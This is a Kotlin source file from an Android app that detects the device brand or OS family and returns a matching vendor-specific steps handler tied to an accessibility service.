package com.storm.safe.rock.service.modules.yw5xud

import android.content.Context
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.yw5xud.generic.GenericSteps
import com.storm.safe.rock.service.modules.yw5xud.meizu.MeizuSteps
import com.storm.safe.rock.service.modules.yw5xud.miui.MiuiSteps
import com.storm.safe.rock.service.modules.yw5xud.oppo.OppoSteps
import com.storm.safe.rock.service.modules.yw5xud.samsung.SamsungSteps
import com.storm.safe.rock.service.modules.yw5xud.vivo.VivoSteps

enum class Brand {
    MIUI, HUAWEI, OPPO, VIVO, SAMSUNG, MEIZU, GENERIC
}

object StepsFactory {
    fun create(
        brand: Brand,
        service: MyAccessibilityService?,
        context: Context
    ): VendorSteps = when (brand) {
        Brand.MIUI -> MiuiSteps(service, context)
        Brand.HUAWEI -> HuaweiSteps(service, context)
        Brand.OPPO -> OppoSteps(service, context)
        Brand.VIVO -> VivoSteps(service, context)
        Brand.SAMSUNG -> SamsungSteps(service, context)
        Brand.MEIZU -> MeizuSteps(service, context)
        Brand.GENERIC -> GenericSteps(service, context)
    }

    fun detectBrand(): Brand = when {
        BrandDetector.isSamsung() -> Brand.SAMSUNG
        BrandDetector.isHuawei() -> Brand.HUAWEI
        BrandDetector.isOppo() -> Brand.OPPO
        BrandDetector.isVivo() -> Brand.VIVO
        BrandDetector.isXiaomi() -> Brand.MIUI
        BrandDetector.isMeizu() -> Brand.MEIZU
        else -> osFamilyToBrand(OsFamily.detect())
    }

    private fun osFamilyToBrand(os: OsFamily): Brand = when (os) {
        OsFamily.EMUI -> Brand.HUAWEI
        OsFamily.MIUI -> Brand.MIUI
        OsFamily.COLOROS -> Brand.OPPO
        OsFamily.ORIGINOS -> Brand.VIVO
        OsFamily.ONEUI -> Brand.SAMSUNG
        OsFamily.FLYME -> Brand.MEIZU
        OsFamily.UNKNOWN -> Brand.GENERIC
    }
}
